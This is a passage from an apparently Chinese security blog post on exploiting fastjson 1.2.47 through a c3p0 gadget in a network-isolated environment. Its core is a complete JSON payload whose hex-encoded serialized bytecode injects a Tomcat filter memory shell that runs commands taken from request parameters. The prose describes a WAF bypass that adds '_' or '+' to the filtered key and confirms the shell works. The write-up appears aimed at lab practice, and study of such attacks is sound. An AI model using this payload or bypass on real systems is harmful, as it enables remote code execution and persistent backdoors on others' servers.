+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span><span class="string">&quot;HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e002000078700000183acafebabe0000003401270a004300920700930800940b000200950a009600970a0096009807009907009a0a009b009c0a0008009d0a0007009e07009f0a000c00920a000700a00a000c00a10a000c00a20a000c00a30b00a400a50a00a600a70a00a800a90a00a800aa0a00a800ab0b00ac00ad0800ae0a00af00b00a00af00b10700b20a001b00b30b00b400b50700b60800b70a003b00b808008d0a003b00b90a00ba00bb0a00ba00bc0700bd0b002500bc0700be0a002700920700bf0a002900920a002900c00a002900c10a003f00c20a003b00c30a002900c40a001e00c50700c60a003100920800c70a003100c80a003100c10900c900ca0a00c900cb0a003100cc0a001e00cd0700ce0700cf0700d00a003b00d10a00d200bb0700d30a00d200d40b002500d50700d60700d70700d80100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100074c465261696e3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e730700d9010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b295601000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000e62756666657265645265616465720100184c6a6176612f696f2f42756666657265645265616465723b01000d737472696e674275696c6465720100194c6a6176612f6c616e672f537472696e674275696c6465723b0100046c696e650100124c6a6176612f6c616e672f537472696e673b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b0100037265710100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b01000d537461636b4d61705461626c650700be0700da0700db0700dc0700930700dd07009907009f0700de0700df01000764657374726f790100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0700e00100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b01000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000f4c6a6176612f7574696c2f4d61703b0700d601000a536f7572636546696c6501000a465261696e2e6a6176610c004500460100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100046368616e0c00e100e20700e30c00e400e50c00e600e70100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720700dd0c00e800e90c004500ea0c004500eb0100176a6176612f6c616e672f537472696e674275696c6465720c00ec00ed0c00ee00ef0c00ee00f00c00f100ed0700db0c00f200f30700de0c00f400f50700f60c00f700f80c00f900460c00fa00460700dc0c005200fb01000c4175746f6d6e6547726565740700fc0c00fd00fe0c00ff01000100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c010101020701030c010401050100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c010601070c0108010907010a0c010b010c0c010d010e01000d6a6176612f7574696c2f4d6170010005465261696e01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c010f01100c011101120c011301140c011500ed0c011601120c0117011801002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100022f2a0c0119011207011a0c011b011c0c008600ed0c011d01120c011e011f0100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701000f6a6176612f6c616e672f436c61737301001b6f72672f6170616368652f636174616c696e612f436f6e746578740c012001210701220100106a6176612f6c616e672f4f626a6563740c012301240c012501260100136a6176612f6c616e672f457863657074696f6e010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e0100116a6176612f6c616e672f50726f636573730100106a6176612f6c616e672f537472696e670100136a6176612f696f2f494f457863657074696f6e010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000c676574506172616d65746572010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e6501001428294c6a6176612f6c616e672f537472696e673b010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b01001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e6701000f6765744f757470757453747265616d01002528294c6a617661782f736572766c65742f536572766c65744f757470757453747265616d3b010008676574427974657301000428295b420100216a617661782f736572766c65742f536572766c65744f757470757453747265616d0100057772697465010005285b422956010005666c757368010005636c6f7365010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b2956010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0021002700430001004400000007000100450046000100470000002f00010001000000052ab70001b10000000200480000000600010000001400490000000c000100000005004a004b00000001004c004d00020047000000350000000200000001b10000000200480000000600010000003f004900000016000200000001004a004b000000000001004e004f000100500000000400010051000100520053000200470000018700050009000000962bc000023a0419041203b900040200c6007eb8000519041203b900040200b600063a05bb000759bb0008591905b60009b7000ab7000b3a06bb000c59b7000d3a071906b6000e593a08c600201907bb000c59b7000d1908b6000f100ab60010b60011b6000f57a7ffdb2cb9001201001907b60011b60013b600142cb900120100b600152cb900120100b60016b12d2b2cb900170300b10000000300480000003a000e00000043000600440012004500230046002d0047003800480041004a004c004b0069004d007a004e0083004f008c0050008d00520095005300490000005c00090023006a005400550005003800550056005700060041004c00580059000700490044005a005b000800000096004a004b000000000096005c005d000100000096005e005f0002000000960060006100030006009000620063000400640000003d0003ff0041000807006507006607006707006807006907006a07006b07006c0000fc002707006dff0023000507006507006607006707006807006900000050000000060002006e00510001006f0046000100470000002b0000000100000001b10000000200480000000600010000005800490000000c000100000001004a004b0000000100700071000200470000003f0000000300000001b10000000200480000000600010000005d004900000020000300000001004a004b000000000001007200730001000000010074007500020050000000040001007600010070007700020047000000490000000400000001b10000000200480000000600010000006200490000002a000400000001004a004b0000000000010072007300010000000100780079000200000001007a007b0003005000000004000100760008007c004600010047000001da0005000a000000de12184bb80019b6001ac0001b4c2bb6001cb9001d0100c0001e4d121fb800201221b600224e2d04b600232d2cb60024c000253a0419041218b900260200c7009cbb002759b700283a05bb002959b7002a3a0619061905b6002b19061218b6002c19061905b6002db6002eb6002f2c1906b60030bb003159b700323a0719071233b6003419071218b600351907b20036b60037b600382c1907b60039123a05bd003b5903123c535904122953b6003d3a08190804b6003e190805bd003f59032c535904190653b60040c0003a3a09190412181909b90041030057a700044bb10001000000d900dc0042000300480000006600190000001800030019000d001a001a001c0025001d002a001e003400200040002100490023005200240059002500600026006d00280073002a007c002b0083002c008a002d0095002f009b003100b0003200b6003300cd003500d9003900dc003700dd003a004900000066000a00490090007d007e000500520087007f00800006007c005d00810082000700b0002900830084000800cd000c004e00850009000300d60086005b0000000d00cc008700880001001a00bf0089008a0002002500b4008b008c0003003400a5008d008e000400640000000a0003fb00d94207008f0000010090000000020091707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000454657374740009546573742e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>被拦截了，尝试发现是过滤了<code>userOverridesAsString</code>，尝试unicode、hex编码绕过依然不行，代码中过滤了\u，\x等编码前缀。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251029121213558.png" alt="image-20251029121213558"></p>
+<p>参考Y4tacker的文章<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，还可以添加<code>_</code>或<code>+</code>关键字绕过。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251029121253462.png" alt="image-20251029121253462"></p>
+<p>成了。测试一下内存马是否打成功。</p>
+<p><img src="/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/image-20251029121346029.png" alt="image-20251029121346029"></p>
+<h3 id="不出网打冰蝎内存马">不出网打冰蝎内存马</h3>
+<p>打冰蝎内存马的时候失败了，还在找原因。</p>
+<h2 id="fastjson1-2-68不出网的writefile漏洞">fastjson1.2.68不出网的writefile漏洞</h2>
+<h2 id="参考">参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1247-waf-c3p0/write-up.md">https://github.com/lemono0/FastJsonParty/blob/main/1247-waf-c3p0/write-up.md</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/Getshell/Mshell/blob/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat/filter/89FRain.java">https://github.com/Getshell/Mshell/blob/main/03-内存马实战/01-Tomcat/filter/89FRain.java</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/">https://y4tacker.github.io/2022/03/30/year/2022/3/浅谈Fastjson绕waf/</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/10/24/FastJson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-10-29 13:03:35
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Java/" title="Java">
+                        #Java
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/FastJson/" title="FastJson">
+                        #FastJson
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                        <b>#</b> Web安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson1-2-47%E7%BB%93%E5%90%88c3p0%E7%BB%95waf%EF%BC%8C%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="toc-text">fastjson1.2.47结合c3p0绕waf，不出网环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E6%99%AE%E9%80%9A%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">不出网打普通内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">不出网打冰蝎内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson1-2-68%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84writefile%E6%BC%8F%E6%B4%9E"><span class="toc-text">fastjson1.2.68不出网的writefile漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2025 X2n.</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2025%2F10%2F26%2FFastJson%25E4%25B8%258D%25E5%2587%25BA%25E7%25BD%2591%25E7%259A%2584%25E5%2588%25A9%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/10/26/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
